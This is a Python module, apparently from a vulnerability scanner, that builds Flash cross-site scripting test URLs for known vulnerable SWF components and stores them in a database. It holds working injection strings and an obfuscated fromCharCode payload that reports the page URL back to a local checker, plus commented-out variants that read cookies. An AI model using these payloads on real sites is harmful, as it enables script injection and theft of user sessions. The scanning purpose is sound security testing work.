import os
from utils import config

def FlashXSS(results):

    browser_path = r'"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"'
    #print browser_path

    AJAX_POC = "eval(String.fromCharCode(0x78,0x6d,0x6c,0x68,0x74,0x74,0x70,0x3d,0x6e,0x65,0x77,0x20,0x58,0x4d,0x4c,0x48,0x74,0x74,0x70,0x52,0x65,0x71,0x75,0x65,0x73,0x74,0x28,0x29,0x3b,0x78,0x6d,0x6c,0x68,0x74,0x74,0x70,0x2e,0x6f,0x70,0x65,0x6e,0x28,0x22,0x47,0x45,0x54,0x22,0x2c,0x22,0x68,0x74,0x74,0x70,0x3a,0x2f,0x2f,0x31,0x32,0x37,0x2e,0x30,0x2e,0x30,0x2e,0x31,0x2f,0x63,0x68,0x65,0x63,0x6b,0x65,0x72,0x2f,0x66,0x75,0x6e,0x63,0x2f,0x31,0x3f,0x61,0x63,0x74,0x69,0x6f,0x6e,0x3d,0x63,0x68,0x65,0x63,0x6b,0x5f,0x78,0x73,0x73,0x26,0x75,0x72,0x6c,0x3d,0x22,0x2b,0x6c,0x6f,0x63,0x61,0x74,0x69,0x6f,0x6e,0x2e,0x68,0x72,0x65,0x66,0x2c,0x74,0x72,0x75,0x65,0x29,0x3b,0x78,0x6d,0x6c,0x68,0x74,0x74,0x70,0x2e,0x73,0x65,0x6e,0x64,0x28,0x29,0x3b));rid=#!RID!#;"
   
    check_table = {
        "ZeroClipboard.swf-1" : r"""?readyFunction=#!POC!#&.swf""",
        "ZeroClipboard.swf-2" : r"""?id=\"))}catch(e){#!POC!#}//&width=500&height=500&.swf""",
        #"swfupload.swf-1"     : r"""?buttonText=test<a href="javascript:#!POC!#"><img src="http://appsec.ws/ExploitDB/cMon.jpg"/></a>&.swf""",
        "swfupload.swf-2"     : r"""?movieName="])}catch(e){#!POC!#}//&.swf""",
        #"Jplayer.swf"       : r"""?jQuery=confirm&id=#!TEXT!#%27)*confirm(document.cookie%2b'&vol=0.8&muted=false&.swf""",
        #FusionCharts Suite
        #"AnyChart.swf"      : r"""?XMLFile=http://appsec.ws/ExploitDB/Configs/AnyChart/3D-Pie-Chart.xml&.swf""",
        #WP-Cumulus
        "flash_detection.swf": r"""?flashContentURL=javascript:#!POC!#&altContentURL=http://www.google.com&.swf"""

        #"*.swf" : r"""?clickTag=javascript:#!POC!#;&.swf"""
        #"*.swf" : r"""?txt=<a href="javascript:#!POC!#">XSS!</a>&.swf"""
        #?version=<a href="javascript:#!POC!#"><img src="http://appsec.ws/ExploitDB/cMon.jpg"/></a><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>&.swf

    }

    check_hash_table = {

    }

    ps = [  r"""?id=%5c%22))}catch(e){#!POC!#}//&width=500&height=500&.swf""",
            r"""?readyFunction=#!POC!#&.swf""",
            r"""?clickTag=javascript:#!POC!#;&.swf""", 
            r"""?movieName="])}catch(e){#!POC!#}//&.swf""",
            r"""?flashContentURL=javascript:#!POC!#&altContentURL=http://www.google.com&.swf"""
            r"""?debug=function(){#!POC!#}"""
        ]


    data_lists = []

    for result in results:
        for p in ps:
            p = p.replace("#!POC!#", AJAX_POC).replace("#!RID!#", str(result.id))
            PoC = result.url+p
            item =  config.db.get("SELECT processer_id FROM result where id = %s", int(result.id))
            data_lists.append((PoC, int(result.id),item.processer_id))

    config.db.reconnect()
    config.db.executemany(
                    "INSERT INTO flash_test_link (PoC,rid,pid) VALUES (%s,%s,%s)", data_lists
                )